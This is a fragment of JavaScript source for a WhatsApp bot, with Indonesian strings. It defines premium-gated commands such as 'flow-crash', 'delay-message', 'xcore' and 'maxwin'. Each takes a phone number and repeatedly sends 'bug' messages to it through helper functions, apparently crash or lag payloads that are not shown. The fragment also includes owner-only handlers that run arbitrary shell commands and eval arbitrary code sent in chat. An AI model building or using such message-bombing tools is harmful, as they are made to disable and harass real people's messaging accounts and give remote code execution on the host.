case 'flow-crash':
case '🥀':{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Example\nKetik: ${prefix + command} 62xxx`)
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
if (org === blockedNum) {
	reply('Ngapain?, Mau Ngebug Developer? Sory Gk Bisa');
	}
await reply(`Please Wait Send Bug To Target ${pepec}`)
await sleep(5000)
await reply(`Succes Send Bug To Target ${pepec}, Please Wait 20 Minutes!!`)
       for (let i = 0; i < 5; i++) {
       await nae(org)
           }
 }

break
case 'delay-message':
case '🌷':{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Example\nKetik: ${prefix + command} 62xxx`)
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
if (org === blockedNum) {
	reply('Ngapain?, Mau Ngebug Developer? Sory Gk Bisa');
	}
await reply(`Please Wait Send Bug To Target ${pepec}`)
await sleep(5000)
await reply(`Succes Send Bug To Target ${pepec}, Please Wait 20 Minutes!!`)
       for (let i = 0; i < 5; i++) {
       await nae2(org)
           }
 }

break
case "flower-crown":
case "🍁":{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Example\nKetik: ${prefix + command} 62xxx`)
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
if (org === blockedNum) {
	reply('Ngapain?, Mau Ngebug Developer? Sory Gk Bisa');
	}
await reply(`Please Wait Send Bug To Target ${pepec}`)
await sleep(5000)
await reply(`Succes Send Bug To Target ${pepec}, Please Wait 20 Minutes!!`)
       for (let i = 0; i < 5; i++) {
       await nae3(org)
           }
 }
 
break
case "xcore":
case "🌸":{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Example\nKetik: ${prefix + command} 62xxx`)
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
if (org === blockedNum) {
	reply('Ngapain?, Mau Ngebug Developer? Sory Gk Bisa');
	}
await reply(`Please Wait Send Bug To Target ${pepec}`)
await sleep(5000)
await reply(`Succes Send Bug To Target ${pepec}, Please Wait 20 Minutes!!`)
       for (let i = 0; i < 10; i++) {
       await nae(org) 
       await nae3(org) 
           }
 }

break
case "maxwin":
case "🌻":{
if (!isCreator & !isPremium) return reply(mess.prem)
if (!q) return reply(`Example\nKetik: ${prefix + command} 62xxx`)
const blockedNum = nomerCreator;
let pepec = q.replace(/[^0-9]/g, "")
let org = pepec + '@s.whatsapp.net'
if (org === blockedNum) {
	reply('Ngapain?, Mau Ngebug Developer? Sory Gk Bisa');
	}
await reply(`Please Wait Send Bug To Target ${pepec}`)
await sleep(5000)
await reply(`Succes Send Bug To Target ${pepec}, Please Wait 20 Minutes!!`)
       for (let i = 0; i < 10; i++) {
       await nae2(org)
       await nae1(org)
           }
 }
break                
                default:
                if (budy.startsWith('$')) {
                    if (!isCreator) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isCreator) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await reply(evaled);
                    } catch (err) {
                        reply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isCreator) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await reply(require('util').format(teks))
                    }
                }
        
        }
  } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
